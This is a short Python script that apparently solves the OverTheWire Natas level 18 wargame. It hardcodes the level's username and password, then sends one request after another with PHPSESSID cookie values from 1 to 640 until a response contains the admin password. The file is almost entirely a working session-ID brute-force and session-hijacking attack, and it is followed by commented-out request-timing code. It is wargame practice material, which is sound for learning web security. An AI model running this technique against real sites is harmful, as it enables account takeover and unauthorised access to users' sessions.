import requests
import datetime
import sys
import re
import datetime

from string import * 

key  = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
user = 'natas18'
url  = 'http://natas18.natas.labs.overthewire.org'



r = requests.Session();
r.auth = (user,key)

for i in range(1,641):

    print 'request sessionid', i
    response = r.get(url, cookies={'PHPSESSID': str(i) })
    if ( 'Password:' in response.text ):
        print response.text
        break



        


# time_start = datetime.datetime.now();

# req = requests.post('http://' + user +':'+ key +"@"+ url, payload)

# time_end = datetime.datetime.now();

# #print time_end - time_start

# print(req.request.body)
# print(req.request.headers)

# print('\n{}\n\n{}'.format(
#     '\n'.join('{}: {}'.format(k, v) for k, v in req.headers.items()),
#     req.text,
# ))
